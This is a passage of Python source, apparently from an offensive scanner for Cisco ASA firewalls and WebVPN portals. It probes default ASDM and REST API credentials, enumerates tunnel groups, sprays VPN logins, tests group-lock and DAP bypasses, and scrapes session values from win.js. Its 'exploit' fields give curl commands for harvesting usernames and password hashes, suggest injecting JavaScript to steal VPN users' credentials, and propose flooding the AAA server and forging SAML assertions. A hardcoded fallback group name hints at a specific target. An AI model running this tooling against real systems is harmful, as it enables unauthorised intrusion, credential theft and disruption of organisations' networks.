                                       or 'asaVersion' in body2):
                        self.findings.append({
                            'type': 'ASA REST API Default Credentials Valid',
                            'severity': 'CRITICAL',
                            'description': (
                                f'REST API at {base} authenticated with '
                                f'"{user}":{pw} — full admin API access'
                            ),
                            'detail': body2[:400],
                            'exploit': (
                                f'curl -sk -u {user}:{pw} {base}/api/v1/vpn/sessiondb/anyconnect | '
                                'jq ".items[].username" → harvest active usernames. '
                                f'curl -sk -u {user}:{pw} -X GET {base}/api/v1/identity/users '
                                '→ full local user database with password hashes.'
                            ),
                        })
                        # Sweep additional REST endpoints for intel
                        for ep in ASA_REST_API_ENDPOINTS[1:]:
                            sc3, b3, _, _ = _get(
                                f'{base}{ep}',
                                headers=auth_hdr,
                                timeout=4,
                            )
                            if sc3 == 200 and b3:
                                self.version_info[f'rest{ep.replace("/", "_")}'] = b3[:200]
                        break
                break  # stop after first responding port

    # ── ASDM default credentials ──────────────────────────────────────────────

    def probe_asdm_default_creds(self):
        """Test ASDM default credentials at management interface paths.

        1e ch18: 'If ASDM authentication is not set up, there is no default
        username. The default password is cisco.'
        ASDM is a Java applet served at /admin/public/index.html.
        Factory config has 'http server enable' and trusts 192.168.1.0/24
        by default — externally-reachable ASDM is a misconfiguration.
        """
        import base64 as _b64

        for path in ASDM_PATHS:
            sc, body, hdrs, _ = _get(f'{self.base_url}{path}', timeout=5)
            if sc not in (200, 302, 401):
                continue

            self.findings.append({
                'type': f'ASDM Interface Reachable ({path})',
                'severity': 'HIGH',
                'description': (
                    f'ASDM at {self.base_url}{path} responds (HTTP {sc}) — '
                    'management UI exposed to internet'
                ),
                'detail': (
                    f'Auth required: {sc == 401} | '
                    f'Content-Type: {hdrs.get("Content-Type", "?")}'
                ),
                'exploit': (
                    'Default creds: no-username / cisco (factory default). '
                    'ASDM Java applet grants full firewall management: '
                    'rule editing, VPN config, user database, running-config read.'
                ),
            })

            # Attempt default credentials via HTTP Basic
            for user, pw in ASDM_DEFAULT_CREDS:
                cred_b64 = _b64.b64encode(f'{user}:{pw}'.encode()).decode()
                auth_hdr = {'Authorization': f'Basic {cred_b64}'}
                sc2, body2, hdrs2, _ = _get(
                    f'{self.base_url}{path}',
                    headers=auth_hdr,
                    timeout=5,
                )
                if sc2 == 200 and any(k in body2.lower()
                                      for k in ('asdm', 'cisco', 'adaptive security')):
                    self.findings.append({
                        'type': 'ASDM Default Credentials Valid',
                        'severity': 'CRITICAL',
                        'description': (
                            f'ASDM authenticated with "{user}":{pw!r} — '
                            f'full management access to {self.host}'
                        ),
                        'detail': (
                            f'Path: {path} | Response length: {len(body2)}'
                        ),
                        'exploit': (
                            f'https://{self.host}{path} → launch ASDM applet '
                            f'with {user}:{pw}. Access: Configuration > Remote '
                            'Access VPN → dump tunnel groups, AAA servers, '
                            'local user accounts, group policies.'
                        ),
                    })
                    return
            return  # reported once per first-responding path

    # ── Tunnel group alias (group-url) enumeration ────────────────────────────

    def probe_group_url_enum(self):
        """Enumerate tunnel group aliases via group-url path probing.

        ASA config: 'tunnel-group <name> webvpn-attributes; group-url <url> enable'
        Users connect via https://host/<alias> which redirects to the group-specific
        logon page with the tg cookie pre-set. Discovering aliases reveals all
        configured tunnel groups, including internal/admin groups not shown in the
        default logon page group dropdown.
        """
        # Build candidate list from constants + known group names
        extra = []
        for g in self.groups:
            slug = g.replace(' ', '-').replace('_', '-').lower()
            extra.extend([f'/{slug}', f'/{g}'])

        seen = set()
        candidates = []
        for c in WEBVPN_GROUP_URL_CANDIDATES + extra:
            if c not in seen:
                seen.add(c)
                candidates.append(c)

        found_aliases = []
        for alias in candidates:
            sc, body, hdrs, ck = _get(f'{self.base_url}{alias}', timeout=5)
            if sc is None:
                continue
            loc = hdrs.get('Location', hdrs.get('location', ''))
            is_logon_redirect = (sc in (301, 302) and
                                 any(k in loc.lower() for k in ('logon', 'webvpn', 'cscoe')))
            is_logon_direct = (sc == 200 and
                               any(k in body.lower() for k in ('username', 'csrf_token', 'tgroup')))
            if is_logon_redirect or is_logon_direct:
                found_aliases.append({'alias': alias, 'status': sc})
                # Extract any new groups from this logon page
                new_groups = parse_tunnel_groups(body)
                for g in new_groups:
                    if g not in self.groups:
                        self.groups.append(g)

        if found_aliases:
            self.findings.append({
                'type': 'Tunnel Group Aliases Discovered (group-url)',
                'severity': 'INFO',
                'description': (
                    f'{len(found_aliases)} group-url aliases respond on {self.host}'
                ),
                'detail': '\n'.join(
                    f'  {a["status"]} {a["alias"]}' for a in found_aliases
                ),
                'exploit': (
                    'Group-specific URLs pre-select the tunnel group — bypass default '
                    'group dropdown for targeted credential spray. '
                    'Admin-only groups not shown in main dropdown may be reachable: '
                    'POST to /+webvpn+/index.html with tgroup=<group> and group-url '
                    'cookie set to bypass the group selector gate.'
                ),
            })

    # ── WebVPN portal application/file surface ────────────────────────────────

    def probe_webvpn_portal_paths(self):
        """Probe WebVPN portal application and file-browsing paths.

        Key paths from 3e ch22:
        - /+CSCOU+/ : unauthenticated web content store (logos, custom JS/HTML)
          accessible without auth per the book: 'choose No for Require
          Authentication to Access Its Content'
        - /+CSCOE+/files/browse.html : CIFS file browser (post-auth, but check)
        - /+CSCOE+/sdesktop/ : Cisco Secure Desktop (HostScan) endpoint
        - /+CSCOE+/win.html : port-forwarding Java applet entry
        Port-forwarding proxy: POST /tcp/<server>/<port> — proxied to internal
        hosts once the applet session is authenticated.
        """
        reachable = []
        for ep in WEBVPN_APP_PATHS:
            sc, body, hdrs, _ = _get(f'{self.base_url}{ep}', timeout=5)
            if sc is None:
                continue
            reachable.append({'endpoint': ep, 'status': sc, 'length': len(body)})

            # /+CSCOU+/ should be unauthenticated — 200 here is expected by design
            # but content may reveal uploaded files or be injectable
            if sc == 200 and ep == '/+CSCOU+/':
                self.findings.append({
                    'type': 'CSCOU Web Content Store Reachable (Unauthenticated)',
                    'severity': 'LOW',
                    'description': (
                        f'/+CSCOU+/ web content store responds on {self.host} without auth. '
                        'Stores uploaded portal images and custom logon scripts.'
                    ),
                    'detail': f'Length: {len(body)} | First 200: {body[:200]}',
                    'exploit': (
                        'If PUT or WebDAV is enabled: inject malicious JS into '
                        '/+CSCOU+/custom.js → XSS against VPN users on logon page. '
                        'Harvest creds from credential pre-fill forms.'
                    ),
                })

            if sc == 200 and 'policy.xml' in ep:
                self.findings.append({
                    'type': 'Cisco Secure Desktop Policy XML Exposed',
                    'severity': 'MEDIUM',
                    'description': (
                        f'CSD policy.xml accessible at {self.base_url}{ep}'
                    ),
                    'detail': body[:400],
                    'exploit': (
                        'CSD policy.xml may disclose endpoint compliance requirements, '
                        'registry checks, and bypass conditions.'
                    ),
                })

        if reachable:
            self.findings.append({
                'type': 'WebVPN Application/File Portal Surface',
                'severity': 'INFO',
                'description': (
                    f'{len(reachable)} WebVPN application endpoints respond on {self.host}'
                ),
                'detail': '\n'.join(
                    f"  {e['status']} {e['endpoint']}" for e in reachable
                ),
            })

    # ── Port-forwarding proxy surface ─────────────────────────────────────────

    def probe_port_forward_surface(self):
        """Probe ASA port-forwarding proxy endpoint and smart-tunnel surface.

        From 3e ch22: the port-forwarding Java applet makes HTTP POST requests to
        https://<ASA>/tcp/<remoteserver>/<remoteport> to proxy TCP connections to
        internal hosts. An authenticated session is required, but the endpoint
        path structure itself is discoverable unauthenticated (returns 302/401).
        Smart tunnels intercept at Winsock2 level; config surface is the
        /+webvpn+/ namespace.
        """
        pf_probe_paths = [
            '/tcp/',                          # port-forward proxy root
            '/+webvpn+/webvpn_logout.html',  # smart tunnel session termination
            '/+CSCOE+/win.html',             # port-forward applet entry page
        ]
        for path in pf_probe_paths:
            sc, body, hdrs, _ = _get(f'{self.base_url}{path}', timeout=5)
            if sc and sc < 500:
                self.findings.append({
                    'type': f'Port-Forward/Smart-Tunnel Surface: {path}',
                    'severity': 'INFO',
                    'description': (
                        f'{path} responds (HTTP {sc}) on {self.host}'
                    ),
                    'detail': (
                        f'Length: {len(body)} | Redirect: {hdrs.get("Location", "none")}'
                    ),
                    'exploit': (
                        'Port-forward proxy: POST /tcp/<internal-host>/<port> with '
                        'authenticated session cookie → proxy TCP to any internal host '
                        'the ASA can reach (SSRF-equivalent within VPN network). '
                        'Smart tunnel: applet intercepts Winsock2 → routes arbitrary '
                        'app traffic; process name in smart-tunnel config is the whitelist.'
                    ),
                })

    # ── AAA LOCAL auth fallback ───────────────────────────────────────────────

    def probe_aaa_local_fallback(self):
        """Test LOCAL authentication fallback with common default credentials.

        From 3e ch07/ch22: 'aaa authentication ... LOCAL' configures LOCAL as
        fallback when the primary server group fails. The 'aaa-server' group has
        a 'Reactivation Mode' setting; Depletion mode means LOCAL kicks in only
        after ALL servers in the group are marked inactive. Common factory local
        accounts: no username / enable password 'cisco' is the factory default.

        Tests are rate-limited to avoid triggering account lockout (Max Failed
        Attempts defaults to 3 per the 3e ch07 AAA server group config).
        """
        if not self.csrf_token:
            self.probe_logon_page()
        if not self.csrf_token:
            return

        # Target non-SAML groups (SAML groups reject password auth entirely)
        test_groups = [
            g for g in self.groups
            if g not in self.saml_groups
            and 'sso' not in g.lower()
        ]
        if not test_groups:
            test_groups = ['MacStadium-VPN']

        attempts = 0
        for group in test_groups[:2]:
            for user, pw in AAA_LOCAL_FALLBACK_CREDS:
                if attempts >= 4:   # stay under lockout threshold
                    break
                result, body = self.test_credential(user, pw, group)
                attempts += 1

                if result == 'success':
                    self.findings.append({
                        'type': 'VPN Auth Success: LOCAL Fallback Default Credentials',
                        'severity': 'CRITICAL',
                        'description': (
                            f'VPN auth succeeded with "{user}":{pw} on '
                            f'group "{group}" at {self.host} '
                            '— local database default credentials active'
                        ),
                        'detail': f'User: {user} | Pass: {pw} | Group: {group}',
                        'exploit': (
                            'Full VPN tunnel access via AnyConnect: '
                            f'https://{self.host} → group={group} → '
                            f'user={user} / pass={pw}. '
                            'If LOCAL is only a fallback: trigger primary AAA '
                            'server timeout by flooding it to force LOCAL auth.'
                        ),
                    })
                    return

                elif result == 'locked':
                    self.findings.append({
                        'type': 'Account Lockout Policy Active',
                        'severity': 'INFO',
                        'description': (
                            f'Account lockout triggered for "{user}" on {self.host} '
                            '— Max Failed Attempts policy enforced'
                        ),
                        'detail': f'Group: {group}',
                    })
                    return

                time.sleep(0.5)  # minimal backoff

    # ── Certificate revocation check / bypass ─────────────────────────────────

    def probe_cert_revocation_check(self):
        """Probe certificate authentication bypass via CRL/OCSP disabled config.

        From 3e ch21: trustpoint config 'revocation-check none' means the ASA
        accepts any cert signed by the trusted CA — including revoked ones.
        'revocation-check crl none' falls back to accepting the cert if CRL
        is unreachable (OCSP/CRL server down or firewalled).

        The certauth.html endpoint is the WebVPN cert auth gate. If it accepts
        a TLS client certificate without revocation verification, any cert issued
        by the target CA (or a compromised subordinate) grants VPN access.
        The certificate-group-map maps cert fields (CN/OU/SAN) to tunnel groups.
        """
        sc, body, hdrs, _ = _get(f'{self.base_url}/+CSCOE+/certauth.html', timeout=5)
        if sc != 200:
            return

        indicators = []
        body_lower = body.lower()
        if 'certificate' in body_lower:
            indicators.append('certificate keyword in page')
        if 'ssl' in body_lower or 'tls' in body_lower:
            indicators.append('SSL/TLS reference')
        if 'certauth' in body_lower:
            indicators.append('certauth reference')
        # Check for pre-fill / username extraction from cert
        if 'pre-fill' in body_lower or 'prefill' in body_lower:
            indicators.append('pre-fill username from cert detected')

        self.findings.append({
            'type': 'Certificate Auth Endpoint Active — Revocation Check Unverified',
            'severity': 'MEDIUM',
            'description': (
                f'ASA {self.host} has WebVPN certificate auth at /+CSCOE+/certauth.html. '
                'If trustpoint configured with "revocation-check none" or CRL server is '
                'unreachable with "none" as fallback, revoked certs are accepted.'
            ),
            'detail': (
                f'HTTP {sc} | Indicators: {", ".join(indicators) or "200 OK"}\n'
                'Verify: "show run crypto ca trustpoint" → revocation-check field\n'
                'Map: "show run tunnel-group" → certificate-group-map entries\n'
                'Pre-fill: certificate-group-map maps CN to tunnel group; '
                'username pre-filled from cert attribute (pre-fill-username)'
            ),
            'exploit': (
                'CRL/OCSP disabled path: obtain any cert signed by the ASA local CA '
                '(or compromise a subordinate CA). Present via TLS client auth:\n'
                f'curl --cert client.pem --key client.key -k '
                f'https://{self.host}/+CSCOE+/certauth.html\n'
                'ASA maps cert CN → tunnel group via certificate-group-map. '
                'With SCEP-enrolled cert: enroll via /+CSCOE+/enroll.html if SCEP proxy active.'
            ),
        })

    # ── SAML/SSO pre-fill and IdP enumeration ────────────────────────────────

    def probe_saml_metadata(self):
        """Fetch SAML SP metadata; extract entityID, ACS URL, and certificate.

        SP metadata at /+CSCOE+/saml/sp/metadata is unauthenticated and discloses
        the SP entityID, ACS URL, and SP signing certificate. The signing cert
        private key on the ASA is used to sign outgoing SAML AuthnRequests —
        if the key is compromised (via REST API or SNMP), forged assertions can
        be submitted to the ACS endpoint to bypass IdP auth entirely.
        """
        sc, body, hdrs, _ = _get(f'{self.base_url}/+CSCOE+/saml/sp/metadata', timeout=6)
        if sc != 200 or not body:
            return

        metadata = {}
        # entityID
        m = re.search(r'entityID=["\']([^"\']+)["\']', body)
        if m:
            metadata['entityID'] = m.group(1)
        # ACS URL
        m = re.search(r'AssertionConsumerService[^>]+Location=["\']([^"\']+)["\']', body)
        if m:
            metadata['acs_url'] = m.group(1)
        # Signing certificate
        m = re.search(r'<ds:X509Certificate>([^<]+)</ds:X509Certificate>', body)
        if m:
            metadata['sp_cert_b64'] = m.group(1)[:80] + '...'
        # NameIDFormat
        m = re.search(r'<NameIDFormat>([^<]+)</NameIDFormat>', body)
        if m:
            metadata['nameid_format'] = m.group(1)

        if metadata:
            self.findings.append({
                'type': 'SAML SP Metadata Disclosed (Unauthenticated)',
                'severity': 'MEDIUM',
                'description': (
                    f'SAML SP metadata at {self.base_url}/+CSCOE+/saml/sp/metadata '
                    'is publicly readable — discloses SP entityID, ACS URL, signing cert'
                ),
                'detail': '\n'.join(f'  {k}: {v}' for k, v in metadata.items()),
                'exploit': (
                    'SP signing cert disclosed. If ASA private key is obtainable '
                    '(via REST API /api/v1/certificate or SNMP MIB), forge SAML '
                    'assertion signed with SP key → POST to ACS URL → '
                    'bypass IdP entirely. ACS accepts SP-signed assertions in some configs.'
                ),
            })

    # ── sysopt + VPN session surface ──────────────────────────────────────────

    def probe_sysopt_vpn_bypass(self):
        """Detect sysopt connection permit-vpn exposure via REST API.

        From Cisco Firewalls (Moraes) ch17: sysopt connection permit-vpn is ON
        by default — all decrypted VPN traffic bypasses interface ACLs entirely.
        This is a critical security misconfiguration: the inbound ACL on the
        outside interface does not filter traffic after VPN decryption.

        REST API endpoint /api/v1/config/sysopt (requires admin auth) returns
        the current sysopt state. If the REST API is unauthenticated (probe_rest_api
        finding), this becomes directly readable.
        """
        endpoints = [
            '/api/v1/config/sysopt',
            '/api/v1/config/interfaces',
        ]
        for ep in endpoints:
            sc, body, _, _ = _get(f'{self.base_url}{ep}', timeout=5)
            if sc == 200 and body:
                if 'permit-vpn' in body.lower() or 'sysopt' in body.lower():
                    self.findings.append({
                        'type': 'sysopt connection permit-vpn State Readable (REST API)',
                        'severity': 'HIGH',
                        'description': (
                            f'REST API at {self.base_url}{ep} returned sysopt config '
                            '(unauthenticated). sysopt connection permit-vpn ON by default '
                            '— VPN-decrypted traffic bypasses all interface ACLs.'
                        ),
                        'detail': body[:300],
                        'exploit': (
                            'Confirm permit-vpn=true. If so: any authorized VPN client '
                            'can reach internal segments not blocked by group-policy '
                            'split-tunnel — the outside ACL does not filter post-decrypt '
                            'traffic. Combine with VPN group-lock bypass for full impact.'
                        ),
                    })
                    return
                # If REST API is live but doesn't expose sysopt, note the default risk
                self.findings.append({
                    'type': 'sysopt connection permit-vpn — Default Risk (REST API Live)',
                    'severity': 'MEDIUM',
                    'description': (
                        f'ASA REST API live at {self.base_url}{ep}. '
                        'Default config: sysopt connection permit-vpn=ON — '
                        'VPN traffic bypasses interface ACLs unless explicitly disabled.'
                    ),
                    'detail': (
                        'Remediation: no sysopt connection permit-vpn + '
                        'explicit ACL permit rules for decrypted traffic.'
                    ),
                })
                return

    def probe_tunnel_group_lock(self):
        """Test VPN group-lock bypass: authenticate into non-assigned tunnel group.

        From Cisco Firewalls (Moraes) ch14: if tunnel-group-list enable is set
        but group-lock is NOT configured in the group-policy, users can auth into
        ANY tunnel group using valid credentials — not just their assigned group.
        This allows policy bypass by selecting a group with weaker restrictions
        (e.g., no split-tunnel, broader network access, no MFA).

        Requires a known valid credential set. If probe_aaa_local_fallback found
        creds, uses them; otherwise skips.
        """
        # find creds from prior findings
        creds = None
        for f in self.findings:
            if 'VPN Auth Success' in f.get('type', '') and 'detail' in f:
                m = re.search(r'User: (\S+) \| Pass: (\S+)', f['detail'])
                if m:
                    creds = (m.group(1), m.group(2))
                    break
        if not creds:
            return

        if not self.csrf_token:
            self.probe_logon_page()
        if not self.csrf_token:
            return

        user, pw = creds
        # Try groups that were NOT the one where creds worked
        known_groups = [g for g in self.groups if 'sso' not in g.lower()]
        if len(known_groups) < 2:
            return

        for group in known_groups[1:2]:  # test one additional group only
            result, _ = self.test_credential(user, pw, group)
            if result == 'success':
                self.findings.append({
                    'type': 'VPN Group-Lock Bypass: Cross-Group Authentication',
                    'severity': 'HIGH',
                    'description': (
                        f'Credential {user}:{pw} authenticated into tunnel group '
                        f'"{group}" — group-lock not enforced in group-policy. '
                        'User can select any group at login, bypassing group-specific '
                        'policy restrictions (split-tunnel, ACLs, session limits).'
                    ),
                    'detail': f'Host: {self.host} | Group tried: {group}',
                    'exploit': (
                        'Select least-restrictive tunnel group at AnyConnect login. '
                        'Group policy attributes (split-tunnel-policy, filter, '
                        'vpn-simultaneous-logins) vary per group — target '
                        'the one with full-tunnel + broadest network access.'
                    ),
                })
                return
            time.sleep(0.3)

    # ── Clientless file/portal unauthenticated access ─────────────────────────

    def probe_clientless_file_access(self):
        """Test unauthenticated access to WebVPN file browsing and portal paths.

        From 3e ch22: file browsing paths (/+CSCOE+/files/) require an active
        WebVPN session cookie. /+CSCOE+/win.js is the JavaScript API served
        by the port-forwarding applet — it may embed group names, session handles,
        or API endpoint paths as JS variables. /+CSCOE+/sdesktop/ is the CSD
        (Cisco Secure Desktop) prelogin assessment redirect target; it should
        produce a redirect or 403, not a 200. /+webvpn+/index.html is the POST
        target for auth submission — a 200 without a session cookie signals a
        form-page exposure. /+CSCOE+/portal.html is the authenticated portal
        home; a 200 here without prior auth is a critical misconfiguration.

        Scoring: any auth-gated path returning 200 with no prior session =
        CRITICAL. win.js returning 200 = HIGH (JS discloses session/group
        state). Auth-gated paths returning unexpected non-302/non-403 = MEDIUM.
        """
        # Paths expected to require an authenticated session
        # (status_expected: what a correctly configured ASA returns when unauth)
        AUTH_GATED = [
            ('/+CSCOE+/files/', (302, 403, 401)),
            ('/+CSCOE+/portal.html', (302, 403, 401)),
            ('/+CSCOE+/win.js', (302, 403, 401)),
            ('/+CSCOE+/sdesktop/', (302, 403, 401)),
            ('/+webvpn+/index.html', (200, 302, 303, 403)),  # 200 = form page, inspect body
        ]

        for path, expected_unauth in AUTH_GATED:
            sc, body, hdrs, _ = _get(f'{self.base_url}{path}', timeout=6)
            if sc is None:
                continue

            is_unexpected_200 = (sc == 200 and path != '/+webvpn+/index.html')
            is_auth_content = False
            if sc == 200 and path == '/+webvpn+/index.html':
                # 200 on POST target is expected (form page); flag only if
                # it looks like it served the post-auth portal
                if any(k in body.lower() for k in ('portal', 'logout', 'webvpn_logout')):
                    is_auth_content = True

            if is_unexpected_200 or is_auth_content:
                self.findings.append({
                    'type': f'Unauthenticated WebVPN Portal Access: {path}',
                    'severity': 'CRITICAL',
                    'description': (
                        f'Auth-gated WebVPN path {path} returns HTTP 200 on '
                        f'{self.host} without a prior authenticated session.'
                    ),
                    'detail': (
                        f'HTTP {sc} | Length: {len(body)}\n'
                        f'Expected unauth status: {expected_unauth}\n'
                        f'Response snippet: {body[:300]}'
                    ),
                    'exploit': (
                        f'Direct access to {self.base_url}{path} — skip logon '
                        'flow entirely. If /+CSCOE+/portal.html: portal session '
                        'may be accessible. If /+CSCOE+/files/: CIFS file browser '
                        'may allow internal share enumeration without credentials.'
                    ),
                })

            # win.js: even a 200 on this path is HIGH — discloses session state
            if path == '/+CSCOE+/win.js' and sc == 200:
                # Extract session tokens or group names embedded as JS vars
                extracted = {}
                for pattern, label in [
                    (r'tg\s*[=:]\s*["\']([^"\']{2,64})["\']', 'tg_value'),
                    (r'group\s*[=:]\s*["\']([^"\']{2,64})["\']', 'group_var'),
                    (r'tunnel[-_]?group\s*[=:]\s*["\']([^"\']{2,64})["\']', 'tunnel_group'),
                    (r'session[-_]?(?:id|token)\s*[=:]\s*["\']([^"\']{8,})["\']', 'session_id'),
                    (r'webvpn[_-]?cookie\s*[=:]\s*["\']([^"\']{4,})["\']', 'webvpn_cookie'),
                    (r'csco[_-]?\w*\s*[=:]\s*["\']([^"\']{4,64})["\']', 'csco_var'),
                ]:
                    m = re.search(pattern, body, re.I)
                    if m:
                        val = m.group(1)
                        extracted[label] = val
                        # If looks like a group name, add to our group list
                        if label in ('tg_value', 'group_var', 'tunnel_group'):
                            if val not in self.groups and len(val) < 64:
                                self.groups.append(val)

                self.findings.append({
                    'type': 'WebVPN win.js Accessible (Port-Forward JS API)',
                    'severity': 'HIGH',
                    'description': (
                        f'/+CSCOE+/win.js returns HTTP 200 on {self.host} — '
                        'port-forwarding JavaScript API served without session validation. '
                        'May embed session handles, group names, or internal endpoint refs.'
                    ),
                    'detail': (
                        f'Length: {len(body)}\n'
                        + ('\n'.join(f'  {k}: {v}' for k, v in extracted.items())
                           if extracted else '  No embedded tokens extracted')
                    ),
                    'exploit': (
                        'win.js is the applet API for the TCP port-forwarding proxy. '
                        'Extracted group/session values feed credential spray or '
                        'session-fixation attacks. Review full JS for internal IP '
                        'addresses, port-forward target lists, and API call endpoints: '
                        f'curl -sk {self.base_url}/+CSCOE+/win.js'
                    ),
                })

    # ── DAP (Dynamic Access Policy) bypass probe ──────────────────────────────

    def probe_dap_bypass(self):
        """Probe for DAP evaluation anomalies via AnyConnect protocol header.

        From 3e ch22: DAP (Dynamic Access Policy) evaluates posture assessment
        data AFTER authentication. The default DAP record (DfltAccessPolicy)
        does NOT restrict sessions that fail to match any DAP record — it allows
        traffic through. This means a client that bypasses endpoint posture checks
        (CSD/HostScan absent, malformed endpoint data) falls through to the
        default allow policy.

        AnyConnect uses the X-Aggregate-Auth: 1 header to signal it is a thick
        client (not a browser). The ASA handles auth differently for this path —
        it returns a different response envelope and may skip browser-oriented
        redirect flows. If the response structure differs from a standard web
        auth failure, it indicates a distinct code path where DAP posture
        enforcement may behave differently.

        Finding: MEDIUM when response differs structurally from baseline.
        This is a surface signal, not a confirmed bypass — verify manually.
        """
        if not self.csrf_token:
            self.probe_logon_page()

        # Baseline: standard web auth failure response
        baseline_data = {
            'username': '__dap_probe__',
            'password': '__x__',
            'tgroup':   (self.groups[0] if self.groups else 'DefaultWEBVPNGroup'),
        }
        if self.csrf_token:
            baseline_data['csrf_token'] = self.csrf_token

        sc_base, body_base, hdrs_base, _ = _post(
            f'{self.base_url}/+webvpn+/index.html',
            data=baseline_data,
            timeout=6,
        )

        # AnyConnect-protocol POST — X-Aggregate-Auth: 1 tells ASA this is a
        # thick client; omit CSRF token (AnyConnect does not use it)
        anyconnect_data = {
            'username':    '__dap_probe__',
            'password':    '__x__',
            'group_list':  (self.groups[0] if self.groups else 'DefaultWEBVPNGroup'),
            'aggregate_auth_version': '2',
        }
        anyconnect_hdrs = {
            'X-Aggregate-Auth': '1',
            'X-AnyConnect-Platform': 'linux-64',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'AnyConnect Linux_64 4.10.07073',
        }

        sc_ac, body_ac, hdrs_ac, _ = _post(
            f'{self.base_url}/+webvpn+/index.html',
            data=anyconnect_data,
            headers=anyconnect_hdrs,
            timeout=6,
        )

        if sc_base is None or sc_ac is None:
            return

        # Structural difference detection
        differs = False
        signals = []

        if sc_ac != sc_base:
            signals.append(f'status_diff: web={sc_base} anyconnect={sc_ac}')
            differs = True

        # Different content-type signals a distinct response envelope
        ct_base = hdrs_base.get('Content-Type', hdrs_base.get('content-type', ''))
        ct_ac   = hdrs_ac.get('Content-Type', hdrs_ac.get('content-type', ''))
        if ct_base != ct_ac:
            signals.append(f'content-type: web={ct_base[:40]} ac={ct_ac[:40]}')
            differs = True

        # AnyConnect auth failure typically returns XML <auth> envelope
        if '<auth>' in body_ac or '<config>' in body_ac or 'aggregate-auth' in body_ac.lower():
            signals.append('anyconnect_xml_auth_envelope_present')
            differs = True

        # Check for ASA sending a different auth challenge type
        if 'failed' not in body_ac.lower() and 'error' not in body_ac.lower() and sc_ac == 200:
            signals.append('no_failure_marker_in_200_response')
            differs = True

        if differs:
            self.findings.append({
                'type': 'DAP Evaluation Anomaly: AnyConnect vs Web Auth Path Divergence',
                'severity': 'MEDIUM',
                'description': (
                    f'ASA {self.host} responds differently to AnyConnect-protocol '
                    '(X-Aggregate-Auth: 1) auth vs standard WebVPN auth. '
                    'Distinct code paths may have different DAP posture enforcement. '
                    'DfltAccessPolicy (fallback) allows all traffic by default per 3e ch22.'
                ),
                'detail': (
                    f'Signals: {"; ".join(signals)}\n'
                    f'Web response: HTTP {sc_base} | Length {len(body_base)}\n'
                    f'AC response:  HTTP {sc_ac} | Length {len(body_ac)}\n'
                    f'AC body snippet: {body_ac[:200]}'
                ),
                'exploit': (
                    'Verify manually: connect with AnyConnect client using valid '
                    'creds + malformed HostScan data. If DfltAccessPolicy has no '
                    'restrictions, DAP posture check is bypassed — full network access '
                    'without endpoint compliance validation. '
                    'Check: does ASA return <auth><title>...</title></auth> on AC path? '
                    'If yes, AC authentication surface is independently testable.'
                ),
            })
        else:
            self.findings.append({
                'type': 'DAP AnyConnect Path Probe: No Divergence Detected',
                'severity': 'INFO',
                'description': (
                    f'AnyConnect-protocol auth to {self.host}/+webvpn+/index.html '
                    'returns structurally identical response to web auth — single '
                    'code path or normalized error response.'
                ),
                'detail': f'Web: {sc_base} | AC: {sc_ac}',
            })

    # ── ASDM default credentials (extended) ───────────────────────────────────

    def probe_asdm_default_creds_extended(self):
        """Extended ASDM default credential probe; includes ASDM launcher check.

        From 3e ch22 / DevNet: ASDM factory defaults are documented as:
          no username, password 'cisco'  — factory default
          'cisco' / 'cisco'              — common post-factory
          'admin' / ''                   — empty-password common after ASDM reset
          ('', 'cisco') already in ASDM_DEFAULT_CREDS; add ('cisco','cisco') and
          ('admin','') as additional candidates from the book.

        /admin/public/index.html is the ASDM Java WebStart launcher page —
        the JNLP launch point that fetches the applet JAR. It should not be
        accessible without auth. If it returns 200 with JNLP or 'asdm' content
        and no auth was provided, flag HIGH (ASDM launcher exposed).

        This probe extends probe_asdm_default_creds() — it does NOT duplicate
        that probe's primary test; it targets additional candidates and the
        JNLP launcher path specifically.
        """
        import base64 as _b64

        EXTENDED_CREDS = [
            ('cisco', 'cisco'),
            ('admin', ''),
            ('', 'cisco'),
        ]

        ASDM_LAUNCHER_PATH = '/admin/public/index.html'

        # --- ASDM launcher unauthenticated check ---
        sc, body, hdrs, _ = _get(f'{self.base_url}{ASDM_LAUNCHER_PATH}', timeout=6)
        if sc == 200:
            ct = hdrs.get('Content-Type', hdrs.get('content-type', ''))
            is_launcher = any(k in body.lower() for k in (
                'asdm', 'java', 'jnlp', 'webstart', 'adaptive security', 'cisco'
            )) or 'jnlp' in ct.lower()
            if is_launcher:
                self.findings.append({
                    'type': 'ASDM Launcher Page Accessible Without Authentication',
                    'severity': 'HIGH',
                    'description': (
                        f'ASDM Java WebStart launcher at {self.base_url}'
                        f'{ASDM_LAUNCHER_PATH} returns HTTP 200 with launcher '
                        f'content — ASDM fully exposed without credential challenge.'
                    ),
                    'detail': (
                        f'Content-Type: {ct}\n'
                        f'Body snippet: {body[:300]}'
                    ),
                    'exploit': (
                        f'Download ASDM: open {self.base_url}{ASDM_LAUNCHER_PATH} '
                        'in browser → Java WebStart launches ASDM applet. '
                        'Full management: ACL editing, VPN config, user DB export, '
                        'running-config read. Try factory default no-username/cisco '
                        'if auth prompt appears despite the 200.'
                    ),
                })

        # --- Extended credential pairs against all ASDM paths ---
        for path in ASDM_PATHS:
            sc_path, body_path, hdrs_path, _ = _get(
                f'{self.base_url}{path}', timeout=5
            )
            if sc_path not in (200, 302, 401):
                continue

            for user, pw in EXTENDED_CREDS:
                cred_b64 = _b64.b64encode(f'{user}:{pw}'.encode()).decode()
                auth_hdr = {'Authorization': f'Basic {cred_b64}'}
                sc2, body2, hdrs2, _ = _get(
                    f'{self.base_url}{path}',
                    headers=auth_hdr,
                    timeout=5,
                )
                if sc2 == 200 and any(k in body2.lower()
                                      for k in ('asdm', 'cisco', 'adaptive security',
                                                'java', 'jnlp')):
                    self.findings.append({
                        'type': 'ASDM Extended Default Credentials Valid',
                        'severity': 'CRITICAL',
                        'description': (
                            f'ASDM at {self.base_url}{path} authenticated with '
                            f'"{user!r}":{pw!r} — full management access to {self.host}'
                        ),
                        'detail': (
                            f'Path: {path} | Response length: {len(body2)}\n'
                            f'Cred: user={user!r} / pass={pw!r}'
                        ),
                        'exploit': (
                            f'https://{self.host}{path} → ASDM applet with '
                            f'{user!r}:{pw!r}. '
                            'Dump running-config: Configuration > Device Management > '
                            'Management Access. Export VPN group policies, local user DB '
                            '(username + password hashes), AAA server shared secrets.'
                        ),
                    })
                    return  # stop on first confirmed cred

    # ── Application inspection pinholes ──────────────────────────────────────

    def probe_application_inspection_pinholes(self) -> list:
        """Detect application inspection pinhole creation surface.

        From Moraes ch12: FTP active mode (PORT command) causes ASA to open an
        inbound TCP/20 data-channel pinhole, bypassing the outside interface ACL.
